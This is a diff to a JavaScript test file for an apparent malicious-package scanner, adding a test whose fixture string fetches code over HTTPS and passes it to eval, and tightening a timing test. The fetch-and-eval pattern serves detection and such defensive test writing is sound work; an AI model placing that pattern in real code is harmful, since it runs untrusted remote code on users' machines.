@@ -74,6 +74,14 @@ test("received code is found on its line, in both tests", () => {
   }
 });
 
+test("on the tree: through a variable declared outside the callback (D-15)", () => {
+  // the response https.get's callback is given, put into the module's variable and run (python: the same)
+  const text = "const https = require('https');\nlet p;\nhttps.get(" + U + ", (res) => {\n  let d = '';\n"
+    + "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { p = d; eval(p); });\n});\n";
+  assert.ok(installScriptRisk(text, true, false, "js").includes(REASON));
+  assert.ok(importTimeRisk(text, "js")[0].includes(REASON));
+});
+
 test("a program written in a string is text; one that runs what it fetches is read as code", () => {
   // (0.1.8) the network call a string literal's text names is the literal's own code: xmlhttprequest's
   // program for `node -e` was "runs code it receives over the network" (core._dl_in_code)
@@ -184,9 +192,9 @@ test("texts built to make the follower work cost about one pass", () => {
     ("eval(" + "x".repeat(400) + "fetch(u)" + ");").repeat(500),
     "shell=True\n" + ("run(".repeat(100) + "fetch(u);").repeat(500),
   ];
-  const start = Date.now();
+  const start = performance.now();
   for (const text of shapes) assert.equal(runsReceivedCode(text), null);
-  assert.ok(Date.now() - start < 30000);
+  assert.ok(performance.now() - start < 30000);
 });
 
 test("a download substituted into a shell's or an interpreter's command line", () => {
